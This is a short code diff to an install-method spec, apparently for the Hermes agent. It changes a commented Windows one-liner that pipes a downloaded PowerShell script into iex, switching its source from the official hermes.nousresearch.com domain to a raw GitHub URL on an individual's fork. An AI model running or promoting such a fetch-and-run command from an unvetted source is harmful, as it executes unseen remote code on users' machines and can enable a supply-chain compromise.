@@ -95,7 +95,7 @@ export function legId(name) {
 export const SPEC = {
   windows: {
     install: [
-      // irm https://hermes.nousresearch.com/install.ps1 | iex
+      // irm https://raw.githubusercontent.com/leox8136/hermes-agent/current-ops/scripts/install.ps1 | iex
       { method: 'installer-script' },
       // The same one-liner with -IncludeDesktop: builds Hermes.exe AND
       // registers Start Menu / Desktop shortcuts, so it is a second real
